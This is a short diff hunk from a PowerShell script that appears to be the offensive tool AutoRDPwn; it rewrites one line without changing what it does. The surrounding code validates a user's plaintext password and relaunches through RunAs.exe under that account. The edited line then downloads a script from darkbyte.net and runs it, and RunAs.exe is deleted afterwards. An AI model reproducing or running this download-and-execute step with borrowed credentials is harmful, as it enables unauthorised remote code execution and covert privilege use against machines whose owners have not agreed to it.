@@ -524,7 +524,7 @@ function Remove-Exclusions {
         Add-Type -AssemblyName System.DirectoryServices.AccountManagement ; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:computername)
         $validate = $obj.ValidateCredentials($user, $PlainTextPassword) ; if ($validate -eq $true ){ Write-Host ; Write-Host "[i] $txt82" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
         if ($local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Start-Process powershell -NoNewWindow -WorkingDirectory $localpath -ArgumentList $PSCommandPath $args" ; del ./RunAs.exe ; exit }}
-        if (!$local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell -useb iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1" ; del ./RunAs.exe ; exit }
+        if (!$local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Invoke-WebRequest -UseBasicParsing https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1" ; del ./RunAs.exe ; exit }
         else { Write-Host ; Write-Host "[!] $txt81" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; del ./RunAs.exe }}
 
         if($othermodule -like 'X'){ $input = 'x' ; continue }
